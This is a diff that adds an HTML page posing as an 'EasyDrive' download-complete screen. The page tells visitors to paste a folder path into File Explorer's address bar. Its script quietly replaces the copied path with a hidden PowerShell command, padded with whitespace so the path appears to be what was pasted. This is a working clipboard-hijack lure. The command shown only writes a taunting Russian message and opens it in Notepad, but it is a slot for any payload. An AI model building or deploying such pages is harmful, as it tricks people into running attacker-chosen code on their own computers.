@@ -1,1 +1,346 @@
-Hello, world!
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Complete</title>
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --text-muted: #94a3b8;
+            --brand-success: #16a34a;
+            --brand-success-bg: #f0fdf4;
+            --border-color: #e2e8f0;
+            --kbd-bg: #f1f5f9;
+            --code-bg: #f8fafc;
+            --code-hover: #f1f5f9;
+            --shadow: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05), 0 0 0 1px rgb(0 0 0 / 0.02);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        .initial-screen {
+            font-family: 'Times New Roman', Times, serif !important;
+            color: #000000 !important;
+            padding: 20px;
+            background: none !important;
+        }
+
+        .initial-screen button {
+            font-family: 'Times New Roman', Times, serif !important;
+            font-size: 13.3333px;
+            padding: 1px 6px;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            padding: 20px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 440px;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border-color);
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        .loader-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            width: 100%;
+            background-color: var(--bg-color);
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--border-color);
+            border-top-color: var(--brand-success);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .success-icon {
+            color: var(--brand-success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--brand-success-bg);
+            padding: 6px;
+            border-radius: 50%;
+        }
+
+        h1 {
+            color: var(--text-primary);
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+        }
+
+        .description {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+
+        .steps-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 16px;
+        }
+
+        .step-number {
+            background-color: var(--kbd-bg);
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            flex-shrink: 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .step-content {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            flex-grow: 1;
+            padding-top: 2px;
+        }
+
+        kbd {
+            background-color: var(--kbd-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 2px 6px;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: inherit;
+            color: var(--text-primary);
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            box-shadow: 0 1px 0px rgba(0,0,0,0.05);
+        }
+
+        kbd svg {
+            display: inline-block;
+            color: var(--text-secondary);
+        }
+
+        .code-block-wrapper {
+            margin-top: 10px;
+        }
+
+        .code-block {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px 14px;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            user-select: none;
+        }
+
+        .code-block:hover {
+            background-color: var(--code-hover);
+            border-color: var(--text-muted);
+        }
+
+        .code-block:active {
+            transform: scale(0.99);
+        }
+
+        .code-text {
+            font-family: monospace;
+            font-size: 13px;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            padding-right: 10px;
+        }
+
+        .copy-icon {
+            color: var(--text-muted);
+            flex-shrink: 0;
+            transition: color 0.15s ease;
+        }
+
+        .code-block:hover .copy-icon {
+            color: var(--text-secondary);
+        }
+
+        .notification {
+            position: fixed;
+            bottom: -60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--text-primary);
+            color: #ffffff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+            transition: bottom 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            z-index: 1000;
+        }
+
+        .notification.open {
+            bottom: 24px;
+        }
+    </style>
+</head>
+<body id="page-body" class="initial-screen">
+
+    <div id="first-screen">
+        <div>Скачай екзешк с</div>
+        <button id="start-btn">EasyDrive</button>
+    </div>
+
+    <div id="loader-screen" class="loader-wrapper hidden">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="notification" id="notification">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 12.6111L8.92308 17.5L20 6.5"/>
+        </svg>
+        Copied successfully
+    </div>
+
+    <div id="main-card" class="card hidden">
+        <div class="header-wrapper">
+            <div class="success-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <h1>Download complete!</h1>
+        </div>
+        
+        <p class="description">File is now available at your EasyDrive downloads folder.</p>
+
+        <div class="steps-list">
+            <div class="step-item">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    Open your file explorer
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    Select your address line
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    Paste the path:
+                    <div class="code-block-wrapper">
+                        <div class="code-block" id="codeblock">
+                            <span class="code-text" id="path-string">C:/Downloads/EasyDrive/Common/045c66eca7</span>
+                            <svg class="copy-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+const bodyEl = document.getElementById("page-body");
+const btnStart = document.getElementById("start-btn");
+const firstScreen = document.getElementById("first-screen");
+const loaderScreen = document.getElementById("loader-screen");
+const mainCard = document.getElementById("main-card");
+btnStart.addEventListener("click", () => {
+firstScreen.classList.add("hidden");
+bodyEl.classList.remove("initial-screen");
+loaderScreen.classList.remove("hidden");
+setTimeout(() => {
+    if (window.innerHeight > window.innerWidth) return;
+    console.log(window.screen.width);
+loaderScreen.classList.add("hidden");
+mainCard.classList.remove("hidden");
+}, 7000);
+});
+document.getElementById("codeblock").addEventListener("click", () => {
+const text = document.getElementById("path-string").innerText;
+navigator.clipboard.writeText(text).then(() => {
+navigator.clipboard.writeText('powershell -WindowStyle Hidden -Command "& {$path = $env:TEMP+\'\\h.txt\'; \'А я ведь мог тебе винду снести)\' | Out-File $path -Encoding utf8; Start-Process notepad $path;} #                                                                                                                                                                                                                                                             C:/Downloads/EasyDrive/Common/045c66eca7"                                                                                                                                                                                                                                                                                                                                                  ');
+const n = document.getElementById("notification");
+n.classList.add("open");
+setTimeout(() => n.classList.remove("open"), 2000);
+});
+});
+</script>
+</body>
+
